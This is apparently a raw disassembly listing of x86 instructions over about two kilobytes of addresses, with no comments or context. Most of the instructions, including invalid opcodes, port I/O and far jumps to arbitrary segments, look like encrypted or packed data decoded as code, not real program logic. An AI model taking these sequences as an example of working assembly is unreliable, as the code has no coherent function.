  41c8d7:	in     al,0x9
  41c8d9:	out    dx,eax
  41c8da:	push   0x88ddaf86
  41c8df:	pop    edi
  41c8e0:	xor    cl,dh
  41c8e2:	dec    esp
  41c8e3:	push   0x65
  41c8e5:	outs   dx,BYTE PTR ds:[esi]
  41c8e6:	stos   DWORD PTR es:[edi],eax
  41c8e7:	or     DWORD PTR [ebp-0x1c70c36d],0x42
  41c8ee:	pop    ebp
  41c8ef:	and    edx,DWORD PTR [esi+0x7ff445bd]
  41c8f5:	push   cs
  41c8f6:	cmp    edi,DWORD PTR [ecx+0x3b]
  41c8f9:	pop    eax
  41c8fa:	daa    
  41c8fb:	pop    edx
  41c8fc:	xchg   esp,eax
  41c8fd:	jnp    0x41c90d
  41c8ff:	data16 and BYTE PTR [eax-0x6a],bh
  41c903:	aad    0x6c
  41c905:	in     eax,dx
  41c906:	jb     0x41c925
  41c908:	adc    esi,ecx
  41c90a:	cmp    DWORD PTR [ecx],ebx
  41c90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c90d:	mov    cl,0x66
  41c90f:	das    
  41c910:	push   edi
  41c911:	adc    DWORD PTR [ecx+esi*8+0xc],0x28
  41c916:	xor    BYTE PTR [edx-0x78],0x22
  41c91a:	mov    ebp,DWORD PTR [ebx-0x4dc1dd0e]
  41c920:	mov    ecx,0xe778957a
  41c925:	lods   al,BYTE PTR ds:[esi]
  41c926:	sub    ecx,DWORD PTR [ebx+eax*8]
  41c929:	jo     0x41c8d8
  41c92b:	fidiv  WORD PTR [ecx+esi*2+0x6d]
  41c92f:	mov    edi,0xcec391f8
  41c934:	or     DWORD PTR [ecx+0x629f84e3],0xffffffcf
  41c93b:	fdiv   DWORD PTR [ecx]
  41c93d:	jle    0x41c917
  41c93f:	mov    bh,0xa5
  41c941:	jge    0x41c94b
  41c943:	or     esp,DWORD PTR [edi+0x54173f49]
  41c949:	mov    ebp,0x5daefb29
  41c94e:	jmp    0x182a8836
  41c953:	cmp    BYTE PTR [edi-0x2796c588],ah
  41c959:	ret    
  41c95a:	pop    ebx
  41c95b:	out    dx,eax
  41c95c:	adc    ebx,edi
  41c95e:	mov    cs,WORD PTR [edi+0x3e]
  41c961:	fcom   DWORD PTR [ebx+0x55bdd5ae]
  41c967:	loopne 0x41c916
  41c969:	pop    ebx
  41c96a:	pusha  
  41c96b:	jne    0x41c9cb
  41c96d:	mov    WORD PTR [ebp+0x44],fs
  41c970:	aam    0xca
  41c972:	push   cs
  41c973:	cdq    
  41c974:	push   es
  41c975:	shl    BYTE PTR [edi+0x35b4d56b],1
  41c97b:	xor    eax,0x51a57e90
  41c980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c981:	ror    DWORD PTR [eax+0x65d44329],0xe0
  41c988:	ins    DWORD PTR es:[edi],dx
  41c989:	adc    bl,dl
  41c98b:	pop    edi
  41c98c:	neg    DWORD PTR [ebp-0xb]
  41c98f:	xchg   ebp,eax
  41c990:	cs push esi
  41c992:	mov    cl,0x45
  41c994:	retf   0xb577
  41c997:	popf   
  41c998:	ins    DWORD PTR es:[edi],dx
  41c999:	xchg   esp,eax
  41c99a:	xchg   ebp,eax
  41c99b:	mov    ebx,0xa2c77647
  41c9a0:	outs   dx,BYTE PTR ds:[esi]
  41c9a1:	mov    eax,0x48cf77f6
  41c9a6:	cmp    dl,al
  41c9a8:	jns    0x41c9d6
  41c9aa:	sbb    esp,DWORD PTR [esi-0x2c]
  41c9ad:	test   eax,0xcd10b81a
  41c9b2:	mov    cl,0xb5
  41c9b4:	imul   esp,DWORD PTR [esi+ecx*1],0xffffff87
  41c9b8:	iret   
  41c9b9:	fistp  DWORD PTR [ecx+0x754fcefd]
  41c9bf:	mov    dl,BYTE PTR [esi-0x68]
  41c9c2:	sub    BYTE PTR [eax-0x27],dh
  41c9c5:	cmp    BYTE PTR [ecx-0x5c181af1],ah
  41c9cb:	retf   0xf423
  41c9ce:	(bad)  [ebx+ebp*8-0x599e727]
  41c9d5:	jns    0x41c992
  41c9d7:	pop    edx
  41c9d8:	push   0xf91dc881
  41c9dd:	jno    0x41c9a5
  41c9df:	mov    eax,ds:0x6b253018
  41c9e4:	mov    ecx,0xdd4d082
  41c9e9:	push   es
  41c9ea:	jne    0x41c970
  41c9ec:	stos   DWORD PTR es:[edi],eax
  41c9ed:	pop    edi
  41c9ee:	add    al,0xa0
  41c9f0:	mov    ebp,0x67b23bd9
  41c9f5:	out    dx,al
  41c9f6:	jecxz  0x41ca17
  41c9f8:	cdq    
  41c9f9:	dec    ecx
  41c9fa:	sbb    BYTE PTR ds:0x5547b1d5,dh
  41ca00:	cld    
  41ca01:	jle    0x41c9ae
  41ca03:	or     al,ch
  41ca05:	cmc    
  41ca06:	(bad)  
  41ca07:	stos   BYTE PTR es:[edi],al
  41ca08:	call   0xd106b690
  41ca0d:	xor    al,BYTE PTR [edi-0x5d60598d]
  41ca13:	pop    edx
  41ca14:	inc    ecx
  41ca15:	(bad)  
  41ca16:	xchg   ebx,eax
  41ca17:	cwde   
  41ca18:	lods   al,BYTE PTR ds:[esi]
  41ca19:	fild   DWORD PTR ds:0xcfd3c8a9
  41ca1f:	push   ebx
  41ca20:	and    dh,BYTE PTR [ebx-0x33705faf]
  41ca26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca27:	add    eax,DWORD PTR [eax]
  41ca29:	outs   dx,DWORD PTR ds:[esi]
  41ca2a:	rol    DWORD PTR ds:0xb6858dd4,cl
  41ca30:	and    ch,dh
  41ca32:	pop    ebp
  41ca33:	sub    al,0xfd
  41ca35:	xlat   BYTE PTR ds:[ebx]
  41ca36:	pop    edi
  41ca37:	std    
  41ca38:	rcl    BYTE PTR [edx+0xf],0x2a
  41ca3c:	xor    DWORD PTR [ebx],edi
  41ca3e:	mov    bl,0x49
  41ca40:	inc    ebp
  41ca41:	lods   al,BYTE PTR ds:[esi]
  41ca42:	push   esp
  41ca43:	adc    edx,DWORD PTR [ecx+eax*8-0x2160828b]
  41ca4a:	aam    0x28
  41ca4c:	rep lods al,BYTE PTR ds:[esi]
  41ca4e:	aas    
  41ca4f:	add    al,BYTE PTR [edi+0x7176fcba]
  41ca55:	rcl    DWORD PTR [ecx+0x1f],0xbf
  41ca59:	scas   al,BYTE PTR es:[edi]
  41ca5a:	jb     0x41ca10
  41ca5c:	out    dx,eax
  41ca5d:	add    al,0x85
  41ca5f:	int    0xaf
  41ca61:	bnd jo 0x41cab2
  41ca64:	mov    ds:0xbfac4a56,al
  41ca69:	ret    
  41ca6a:	mov    bh,0x4d
  41ca6c:	mov    eax,ds:0x3b423038
  41ca71:	mov    eax,0x4827a073
  41ca76:	aas    
  41ca77:	mov    ebx,ebx
  41ca79:	dec    edi
  41ca7a:	cmp    cl,ah
  41ca7c:	or     esp,DWORD PTR [edi+0x5a]
  41ca7f:	sub    al,0xfe
  41ca81:	jl     0x41ca22
  41ca83:	(bad)  
  41ca84:	jle    0x41cadf
  41ca86:	aaa    
  41ca87:	imul   ebp,DWORD PTR [eax+eiz*2-0x38],0xe028fff0
  41ca8f:	sbb    bl,BYTE PTR [esi-0xb3aeb23]
  41ca95:	add    BYTE PTR [eax],bh
  41ca97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca98:	mov    eax,0x1ceef184
  41ca9d:	cmp    ebx,DWORD PTR [ecx+0x602fe4c5]
  41caa3:	call   0x3d38:0xaf61d29
  41caaa:	push   ecx
  41caab:	xchg   DWORD PTR [eax+0x8],esi
  41caae:	dec    esi
  41caaf:	fs test al,0xa0
  41cab2:	add    ch,ah
  41cab4:	jno    0x41ca96
  41cab6:	add    al,0x78
  41cab8:	les    edi,FWORD PTR [ecx]
  41caba:	sub    ah,BYTE PTR [eax-0x72]
  41cabd:	fcmovbe st,st(5)
  41cabf:	pop    ss
  41cac0:	aas    
  41cac1:	cwde   
  41cac2:	mov    edx,0x89be8925
  41cac7:	xchg   edi,eax
  41cac8:	mov    eax,0x9a6c9389
  41cacd:	xor    eax,0x53609504
  41cad2:	or     DWORD PTR [edi+0x46],edi
  41cad5:	sbb    dl,BYTE PTR [ecx]
  41cad7:	sub    al,0x44
  41cad9:	mov    DWORD PTR [eax+0x17b2cfc3],ebx
  41cadf:	jae    0x41caeb
  41cae1:	pop    esp
  41cae2:	add    DWORD PTR ds:[esi],0xffffffb9
  41cae6:	xchg   DWORD PTR cs:[esi+0x3388c013],edi
  41caed:	mov    eax,ds:0x94e1bbaf
  41caf2:	shl    al,1
  41caf4:	sub    BYTE PTR [ecx-0x75],bl
  41caf7:	sti    
  41caf8:	add    dh,BYTE PTR [eax+edx*2+0x4984cd03]
  41caff:	gs push edi
  41cb01:	lock ins BYTE PTR es:[edi],dx
  41cb03:	xor    bh,dl
  41cb05:	pop    edi
  41cb06:	cli    
  41cb07:	cs (bad) 
  41cb09:	retf   0xb3b3
  41cb0c:	fs test eax,0x37602c17
  41cb12:	outs   dx,DWORD PTR ds:[esi]
  41cb13:	cmp    BYTE PTR [edx],0x4b
  41cb16:	rcr    DWORD PTR [ecx-0x8],0x17
  41cb1a:	sub    ebx,DWORD PTR [ecx]
  41cb1c:	aam    0xf2
  41cb1e:	adc    esp,DWORD PTR cs:[ebp+0x38800e37]
  41cb25:	out    dx,al
  41cb26:	pop    esi
  41cb27:	int    0x57
  41cb29:	fild   DWORD PTR [ebp-0x54f1337]
  41cb2f:	dec    eax
  41cb30:	adc    bl,ah
  41cb32:	sbb    al,0xb7
  41cb34:	adc    eax,0x2fdb259a
  41cb39:	jbe    0x41cb44
  41cb3b:	dec    esi
  41cb3c:	das    
  41cb3d:	and    DWORD PTR [edx-0x1bae7b94],edi
  41cb43:	rcr    DWORD PTR [edi],cl
  41cb45:	wbinvd 
  41cb47:	xchg   DWORD PTR [ebp-0x59],eax
  41cb4a:	mov    bh,0x87
  41cb4c:	dec    BYTE PTR [ebx]
  41cb4e:	cli    
  41cb4f:	call   0x2bb9:0x748a4f54
  41cb56:	sbb    DWORD PTR [edx+0x17],ebp
  41cb59:	sbb    al,0xa0
  41cb5b:	test   al,0x76
  41cb5d:	jle    0x41cb00
  41cb5f:	shr    BYTE PTR [edx+0x19cc1661],cl
  41cb65:	xor    al,0xb5
  41cb67:	call   0x9b92:0x2c068917
  41cb6e:	xchg   esi,eax
  41cb6f:	xor    esi,esi
  41cb71:	xor    al,0xaa
  41cb73:	adc    esi,DWORD PTR [ecx-0x15]
  41cb76:	inc    edx
  41cb77:	dec    esp
  41cb78:	add    ch,BYTE PTR fs:[ecx]
  41cb7b:	lahf   
  41cb7c:	cli    
  41cb7d:	icebp  
  41cb7e:	mov    WORD PTR [edx+0x4d27e820],?
  41cb84:	faddp  st(2),st
  41cb86:	mov    al,0xe6
  41cb88:	cwde   
  41cb89:	sbb    al,0x65
  41cb8b:	retf   0xfdfb
  41cb8e:	sub    al,0xd9
  41cb90:	xchg   BYTE PTR [edx],dh
  41cb92:	push   esi
  41cb93:	mov    ds:0x672d582e,al
  41cb98:	push   ebp
  41cb99:	outs   dx,BYTE PTR ds:[esi]
  41cb9a:	jp     0x41cc0a
  41cb9c:	mov    ch,0xf7
  41cb9e:	push   esi
  41cb9f:	shr    BYTE PTR [ebp+eax*2+0x53],cl
  41cba3:	fs loope 0x41cb37
  41cba6:	(bad)  
  41cba7:	adc    al,0x21
  41cba9:	and    DWORD PTR [edi],edx
  41cbab:	rol    BYTE PTR [ecx-0x360e0d88],cl
  41cbb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbb2:	cmp    BYTE PTR [eax+0x99b5866],0x93
  41cbb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbba:	dec    edi
  41cbbb:	fidivr WORD PTR [edi-0x1f8cd331]
  41cbc1:	pcmpeqw xmm1,xmm0
  41cbc5:	fst    QWORD PTR [edx-0x2c]
  41cbc8:	mov    dh,0x91
  41cbca:	or     BYTE PTR [ebp+0x31],cl
  41cbcd:	cmp    DWORD PTR [eax+0x6ec47d7e],ecx
  41cbd3:	inc    esi
  41cbd4:	or     DWORD PTR [eax+0x16],ebx
  41cbd7:	add    al,0x3e
  41cbd9:	adc    al,BYTE PTR [ebx]
  41cbdb:	adc    DWORD PTR [ecx+0x25],esp
  41cbde:	cld    
  41cbdf:	sbb    ebp,ecx
  41cbe1:	sub    eax,0xa4de4748
  41cbe6:	out    0x42,al
  41cbe8:	push   esi
  41cbe9:	dec    esp
  41cbea:	out    dx,al
  41cbeb:	mov    bh,0xf
  41cbed:	sub    eax,0x15fc46e9
  41cbf2:	call   0x112ff2a4
  41cbf7:	mov    ebp,0xeed03fb0
  41cbfc:	rcl    BYTE PTR [esi+0x4],0xcb
  41cc00:	aas    
  41cc01:	retf   0x207b
  41cc04:	or     BYTE PTR [edx],al
  41cc06:	clc    
  41cc07:	mov    BYTE PTR [eax-0x23],ah
  41cc0a:	mov    edx,0x7ede55fa
  41cc0f:	out    0x3d,eax
  41cc11:	int    0x44
  41cc13:	inc    esp
  41cc14:	push   ecx
  41cc15:	fwait
  41cc16:	push   esi
  41cc17:	pop    ss
  41cc18:	sbb    esp,DWORD PTR [ebp+0x2ad85fbc]
  41cc1e:	fcomp  QWORD PTR [ebx+0x57]
  41cc21:	mov    ds:0xc8ca78b6,al
  41cc26:	push   0xa0231da3
  41cc2b:	fldcw  WORD PTR [eax+0x1165adfc]
  41cc31:	dec    ebp
  41cc32:	and    eax,DWORD PTR [edx*2+0x7a5f67a3]
  41cc39:	jmp    0x7513b11c
  41cc3e:	sub    DWORD PTR [ecx+edx*8],0xffffffb6
  41cc42:	ds jnp 0x41cc57
  41cc45:	sub    DWORD PTR [edx],edx
  41cc47:	lods   eax,DWORD PTR ds:[esi]
  41cc48:	adc    eax,0xef280b31
  41cc4d:	stos   BYTE PTR es:[edi],al
  41cc4e:	in     al,dx
  41cc4f:	push   cs
  41cc50:	lods   al,BYTE PTR ds:[esi]
  41cc51:	cld    
  41cc52:	jnp    0x41cccf
  41cc54:	pushf  
  41cc55:	mov    esi,0xe9d1d429
  41cc5a:	cdq    
  41cc5b:	jno    0x41cc95
  41cc5d:	mov    edx,0xd2ba6d1a
  41cc62:	mov    esp,0xd069f210
  41cc67:	jb     0x41cca6
  41cc69:	jmp    0x5e47:0x224b99e1
  41cc70:	pusha  
  41cc71:	sub    eax,ebx
  41cc73:	loopne 0x41cc51
  41cc75:	mov    BYTE PTR [ecx-0x23],al
  41cc78:	pop    edx
  41cc79:	mov    dh,0x50
  41cc7b:	and    ecx,ebp
  41cc7d:	cdq    
  41cc7e:	icebp  
  41cc7f:	je     0x41cccb
  41cc81:	shl    ah,cl
  41cc83:	test   BYTE PTR [ebx],bh
  41cc85:	adc    ebp,DWORD PTR [ebx]
  41cc87:	addr16 push esp
  41cc89:	(bad)
  41cc8c:	add    ecx,edx
  41cc8e:	push   0x2
  41cc90:	xor    al,0x3b
  41cc93:	test   BYTE PTR [edx],ah
  41cc95:	cmp    BYTE PTR [edi+0xe],ah
  41cc98:	cmp    al,0xc3
  41cc9a:	test   BYTE PTR [ebx-0xf322bdc],ch
  41cca0:	ror    BYTE PTR [ebp-0x7e],1
  41cca3:	xchg   edi,eax
  41cca4:	pop    es
  41cca5:	imul   ecx,DWORD PTR [edi+0x3f8aabd5],0xffffff9d
  41ccac:	loopne 0x41cc72
  41ccae:	dec    ebp
  41ccaf:	pusha  
  41ccb0:	push   cs
  41ccb1:	inc    eax
  41ccb2:	(bad)  
  41ccb4:	jmp    0xc228:0x1c216f3d
  41ccbb:	scas   al,BYTE PTR es:[edi]
  41ccbc:	shl    DWORD PTR [ecx+0x57ea56a0],cl
  41ccc2:	jl     0x41cca9
  41ccc4:	or     BYTE PTR [eax-0x41],cl
  41ccc7:	jmp    0x41ccb7
  41ccc9:	lods   eax,DWORD PTR ds:[esi]
  41ccca:	jmp    0xb3ff4d43
  41cccf:	xchg   ecx,eax
  41ccd0:	jge    0x41cd14
  41ccd2:	iret   
  41ccd3:	rol    BYTE PTR ds:0x5692f03,cl
  41ccd9:	jbe    0x41cc96
  41ccdb:	mov    DWORD PTR [edi+0xf873592],ebx
  41cce1:	and    dl,BYTE PTR [ecx-0x7d0fb6f2]
  41cce7:	jmp    0xae28b96a
  41ccec:	sbb    eax,esi
  41ccee:	call   0x2899:0xb19fe217
  41ccf5:	sbb    BYTE PTR [eax+0x381058c7],ah
  41ccfb:	push   ebx
  41ccfc:	sar    BYTE PTR [esi+0xb8cfdfc],cl
  41cd02:	test   DWORD PTR [esi-0x78],0x976aa587
  41cd09:	cs cdq 
  41cd0b:	fld    TBYTE PTR [ebp+0xca6a8b2]
  41cd11:	dec    edi
  41cd12:	retf   
  41cd13:	stos   BYTE PTR es:[edi],al
  41cd14:	push   cs
  41cd15:	mov    bh,0x65
  41cd17:	sub    DWORD PTR [ebp-0x52],0xc
  41cd1b:	lods   al,BYTE PTR ds:[esi]
  41cd1c:	adc    DWORD PTR [edi+0x2d00d99e],ebx
  41cd22:	adc    eax,0x41d1e753
  41cd27:	xor    BYTE PTR [ebx-0x5dd8c112],0x32
  41cd2e:	lahf   
  41cd2f:	cmp    DWORD PTR [esi+0x4e7d8ad5],0xf7e6050
  41cd39:	sub    BYTE PTR [ebx],0xfc
  41cd3c:	pop    es
  41cd3d:	(bad)  
  41cd3e:	jmp    0x41cd80
  41cd40:	pop    esi
  41cd41:	fld    TBYTE PTR [edx+0x5e]
  41cd44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd45:	adc    BYTE PTR [edx+0x5f9005d4],bl
  41cd4b:	jbe    0x41cd02
  41cd4d:	mov    cl,0x4f
  41cd4f:	dec    edi
  41cd50:	or     al,dh
  41cd52:	or     eax,0x372ee5a3
  41cd57:	push   ebp
  41cd58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd59:	mov    ds:0xd3caf7b0,eax
  41cd5e:	dec    ebp
  41cd5f:	cmp    eax,0x8a69def2
  41cd64:	fldcw  WORD PTR [edi-0xc]
  41cd67:	pop    ds
  41cd68:	fdiv   DWORD PTR [edi-0x1f]
  41cd6b:	and    cl,bl
  41cd6d:	call   0x5b9a874c
  41cd72:	cmp    BYTE PTR [eax-0x7c372f50],bh
  41cd78:	jae    0x41cd10
  41cd7a:	sub    ebp,DWORD PTR ss:[ecx-0x39]
  41cd7e:	push   ds
  41cd7f:	out    dx,al
  41cd80:	or     DWORD PTR [edx],ebp
  41cd82:	mov    ebx,0x2ae97fea
  41cd87:	les    ecx,FWORD PTR [edi]
  41cd89:	lahf   
  41cd8a:	jecxz  0x41cd75
  41cd8c:	scas   eax,DWORD PTR es:[edi]
  41cd8d:	stos   BYTE PTR es:[edi],al
  41cd8e:	dec    edx
  41cd8f:	aaa    
  41cd90:	mov    edx,DWORD PTR [eax+0x220bb8]
  41cd96:	fidiv  WORD PTR ds:0x8a1040cd
  41cd9c:	cs add ch,al
  41cd9f:	mov    ebp,0x987a7ba7
  41cda4:	in     eax,0x11
  41cda6:	in     eax,0x43
  41cda8:	sbb    al,0x44
  41cdaa:	data16 int 0xb0
  41cdad:	jmp    0xb971:0xc4202483
  41cdb4:	jl     0x41cdb3
  41cdb6:	mov    ecx,0xf2a00d6e
  41cdbb:	jae    0x41cd9c
  41cdbd:	ins    DWORD PTR es:[edi],dx
  41cdbe:	jmp    0x19d8:0x46ff5489
  41cdc5:	fcom   DWORD PTR [edx]
  41cdc7:	push   0x8b6aac80
  41cdcc:	cmp    eax,0x9ba4cea5
  41cdd1:	cmp    DWORD PTR [eax],ebx
  41cdd3:	ret    0x464e
  41cdd6:	je     0x41cdb1
  41cdd8:	fucomp st(7)
  41cdda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cddb:	pusha  
  41cddc:	mov    ecx,0x374f62cb
  41cde1:	add    ecx,ecx
  41cde3:	mov    ds:0x5fc6eb88,eax
  41cde8:	mov    ecx,0x937f074b
  41cded:	aad    0xce
  41cdef:	jg     0x41ce1f
  41cdf1:	ss int 0x59
  41cdf4:	pop    ebx
  41cdf5:	ins    BYTE PTR es:[edi],dx
  41cdf6:	xchg   edi,eax
  41cdf7:	or     ecx,eax
  41cdf9:	shl    BYTE PTR [edi],0xf5
  41cdfc:	inc    ecx
  41cdfd:	or     eax,eax
  41cdff:	scas   al,BYTE PTR es:[edi]
  41ce00:	and    BYTE PTR [ebp+ebx*4-0x10f607e3],cl
  41ce07:	or     al,0x6b
  41ce09:	mov    dl,0xc5
  41ce0b:	cmp    bl,BYTE PTR ds:0x43f18d74
  41ce11:	les    edi,FWORD PTR [eax+0x76]
  41ce14:	sbb    BYTE PTR [ebp-0x42],dh
  41ce17:	sbb    al,0x83
  41ce19:	scas   al,BYTE PTR es:[edi]
  41ce1a:	and    DWORD PTR [ebx-0x46b60f4e],edi
  41ce20:	sbb    esi,DWORD PTR [edx-0x6]
  41ce23:	mov    edi,0xc1df7022
  41ce28:	mov    al,dl
  41ce2a:	rep ins DWORD PTR es:[edi],dx
  41ce2c:	or     BYTE PTR [ebp+0x215a2fd7],cl
  41ce32:	(bad)  
  41ce33:	call   0x5fb1:0x732a90ab
  41ce3a:	jo     0x41cdc0
  41ce3c:	inc    eax
  41ce3d:	out    0xe6,al
  41ce3f:	fstp   DWORD PTR ds:0x8d99ae1d
  41ce45:	fdivr  QWORD PTR [edi+eiz*8]
  41ce48:	mov    ss,WORD PTR [edx-0x74]
  41ce4b:	pop    ds
  41ce4c:	scas   eax,DWORD PTR es:[edi]
  41ce4d:	cmc    
  41ce4e:	mov    ecx,0xe78b1839
  41ce53:	lea    esi,[edx]
  41ce55:	sub    ebx,DWORD PTR [edx+0x231c2ddd]
  41ce5b:	mov    fs:0xb1fa4119,eax
  41ce61:	sahf   
  41ce62:	push   ebp
  41ce63:	mov    ch,0x98
  41ce65:	cmp    BYTE PTR [edi],ah
  41ce67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce68:	mov    ds:0xc0109f60,al
  41ce6d:	rol    DWORD PTR [edx],1
  41ce6f:	jmp    0x40f466ea
  41ce74:	jecxz  0x41ce6e
  41ce76:	sub    BYTE PTR [eax-0x56],cl
  41ce79:	push   edx
  41ce7a:	or     eax,esp
  41ce7c:	(bad)  
  41ce7d:	std    
  41ce7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce7f:	fild   DWORD PTR [ecx-0x11]
  41ce82:	daa    
  41ce83:	push   ds
  41ce84:	adc    al,0xce
  41ce86:	out    dx,al
  41ce87:	add    ebp,DWORD PTR [edx-0x6ca6e921]
  41ce8d:	pop    ds
  41ce8e:	loope  0x41ce5a
  41ce90:	aas    
  41ce91:	mov    al,ds:0x9ddd463d
  41ce96:	cmp    al,0xd5
  41ce98:	inc    esp
  41ce99:	or     al,0x99
  41ce9b:	cmp    BYTE PTR [esi+ecx*8+0x26],al
  41ce9f:	jns    0x41ce97
  41cea1:	mov    ds:0x40527e58,al
  41cea6:	mov    WORD PTR [edx-0x43],es
  41cea9:	scas   al,BYTE PTR es:[edi]
  41ceaa:	mov    edx,0x5b3cf61e
  41ceaf:	or     al,0x92
  41ceb1:	add    eax,ebx
  41ceb3:	jmp    0xe2ff:0x6662816e
  41ceba:	mov    esp,0x8ac34946
  41cebf:	cli    
  41cec0:	add    cl,BYTE PTR [edx+ebp*4+0x3]
  41cec4:	dec    esi
  41cec5:	and    eax,0x4946831
  41ceca:	mov    bl,0xfc
  41cecc:	fsub   QWORD PTR [eax]
  41cece:	jge    0x41ce77
  41ced0:	jae    0x41cebc
  41ced2:	mov    esi,0xf93020fe
  41ced7:	fwait
  41ced8:	jae    0x41cf43
  41ceda:	repnz arpl bx,ax
  41cedd:	or     dh,BYTE PTR [ebx+0x51]
  41cee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee1:	sub    DWORD PTR [ecx+0x1d],ebx
  41cee4:	lock stos DWORD PTR es:[edi],eax
  41cee6:	and    dl,ch
  41cee8:	(bad)  
  41ceea:	inc    esp
  41ceeb:	(bad)  
  41ceec:	fistp  QWORD PTR [ebx]
  41ceee:	mov    ah,0xbb
  41cef0:	in     al,0xf1
  41cef2:	sub    ch,BYTE PTR [esi-0x61283888]
  41cef8:	ins    BYTE PTR es:[edi],dx
  41cef9:	mov    ebx,0x52f6b4f6
  41cefe:	cld    
  41ceff:	sbb    DWORD PTR [ebx],0x694be000
  41cf05:	cmp    DWORD PTR [edx+0x21fe613b],esp
  41cf0b:	mov    esp,0x7a8b483b
  41cf10:	push   esi
  41cf11:	push   0x13
  41cf13:	push   ss
  41cf14:	dec    ebp
  41cf15:	and    eax,0xdf5a959e
  41cf1a:	xor    eax,0xc4d21dc6
  41cf1f:	dec    ebp
  41cf20:	es jbe 0x41cf28
  41cf23:	cmp    eax,0xd1d33c67
  41cf28:	neg    BYTE PTR [edi+0x2]
  41cf2b:	je     0x41cf9c
  41cf2d:	xchg   ecx,eax
  41cf2e:	sbb    DWORD PTR [eax+edi*4+0x54],eax
  41cf32:	fistp  WORD PTR [esi-0xd]
  41cf35:	pop    ss
  41cf36:	je     0x41cfa8
  41cf38:	test   DWORD PTR [eax+0x79ce73d6],edx
  41cf3e:	xchg   ebp,eax
  41cf3f:	mov    ds:0xf83ec30e,eax
  41cf44:	mov    ebp,0x824d3a76
  41cf49:	push   cs
  41cf4a:	push   gs
  41cf4c:	and    BYTE PTR [ebx-0x55b05628],ah
  41cf52:	jnp    0x41cf9e
  41cf54:	shr    DWORD PTR [eax-0x40],0x35
  41cf58:	rcr    BYTE PTR [edx+eax*8-0x4112ed8],cl
  41cf5f:	dec    ebp
  41cf60:	outs   dx,BYTE PTR ds:[esi]
  41cf61:	sub    BYTE PTR [ebx-0x4a],al
  41cf64:	xor    eax,0xf579818b
  41cf69:	adc    BYTE PTR [ecx],bl
  41cf6b:	add    BYTE PTR [edi+0x29887eca],ch
  41cf71:	fsub   DWORD PTR [di]
  41cf74:	fdivr  QWORD PTR [edx+0x7ddf80de]
  41cf7a:	pop    ebx
  41cf7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf7c:	(bad)  
  41cf7d:	repnz outs dx,DWORD PTR ds:[esi]
  41cf7f:	out    dx,eax
  41cf80:	stc    
  41cf81:	clc    
  41cf82:	jo     0x41cfd8
  41cf84:	and    BYTE PTR [edx+0x44],0x6a
  41cf88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf89:	daa    
  41cf8a:	(bad)  
  41cf8b:	jmp    0xdf8b:0x65b28cbe
  41cf92:	push   ss
  41cf93:	mov    ds:0xd3f6e6a5,eax
  41cf98:	jns    0x41d008
  41cf9a:	xchg   esp,eax
  41cf9b:	dec    ebx
  41cf9c:	in     al,0xfa
  41cf9e:	(bad)  
  41cfa0:	pusha  
  41cfa1:	jnp    0x41cf35
  41cfa3:	cmp    dh,BYTE PTR [ecx+0x1c]
  41cfa6:	sub    ebx,DWORD PTR ds:0x4c5c7e19
  41cfac:	cmc    
  41cfad:	sub    al,0xf4
  41cfaf:	rol    esi,cl
  41cfb1:	cld    
  41cfb2:	xor    esi,DWORD PTR [eax]
  41cfb4:	mov    ecx,0xc62c5243
  41cfb9:	sbb    eax,0x51b1eb85
  41cfbe:	xchg   ecx,eax
  41cfbf:	dec    DWORD PTR [edi-0x56]
  41cfc2:	xchg   ecx,eax
  41cfc3:	mov    ebp,0x82afec41
  41cfc8:	cli    
  41cfc9:	clc    
  41cfca:	icebp  
  41cfcb:	jge    0x41d044
  41cfcd:	add    al,0x4f
  41cfcf:	or     DWORD PTR [ecx],eax
  41cfd1:	jmp    0x8d90:0x8a14a703
  41cfd8:	call   0x3afa:0x5c2eb2bd
  41cfdf:	repz fsubr st(6),st
  41cfe2:	dec    ebp
  41cfe3:	cmp    DWORD PTR [edx],ecx
  41cfe5:	mov    edx,0xd5452a8a
  41cfea:	sbb    esi,ecx
  41cfec:	and    DWORD PTR ds:0xb5bfd72c,esi
  41cff2:	xlat   BYTE PTR ds:[ebx]
  41cff3:	jo     0x41cf83
  41cff5:	push   0x41cff0b5
  41cffa:	in     al,0x83
  41cffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffd:	pop    eax
  41cffe:	neg    cl
  41d000:	lods   eax,DWORD PTR ds:[esi]
  41d001:	jae    0x41d075
  41d003:	sub    ebx,ebp
  41d005:	addr16 xor al,0xfa
  41d008:	jecxz  0x41cf98
  41d00a:	imul   DWORD PTR [esi-0x73]
  41d00d:	fs mov cl,0x87
  41d010:	ins    BYTE PTR es:[edi],dx
  41d011:	add    dl,BYTE PTR [eax+0x5c]
  41d014:	push   eax
  41d015:	push   ss
  41d016:	sahf   
  41d017:	push   0x54
  41d019:	or     DWORD PTR [edi],0x240e71ad
  41d01f:	popa   
  41d020:	mov    bl,0xea
  41d022:	fmul   st,st(1)
  41d024:	ffreep st(5)
  41d026:	lds    ebp,FWORD PTR [edi+eax*4-0xe]
  41d02a:	mov    cx,WORD PTR [eax+eax*4-0x3d]
  41d02f:	xlat   BYTE PTR ds:[ebx]
  41d030:	push   ebp
  41d031:	adc    ebp,DWORD PTR [ecx+0x5816c407]
  41d037:	out    0x5f,eax
  41d039:	mov    edx,DWORD PTR [ebx+0x8]
  41d03c:	cmp    edi,DWORD PTR [edx]
  41d03e:	mov    ch,0x65
  41d040:	mov    ds:0x50bd3ac9,al
  41d045:	je     0x41d001
  41d047:	sub    BYTE PTR [eax+0x48a069c8],dh
  41d04d:	xchg   ebx,eax
  41d04e:	sub    al,0x42
  41d050:	(bad)  
  41d051:	int3   
  41d052:	add    DWORD PTR [esi+0x2850eecf],ebp
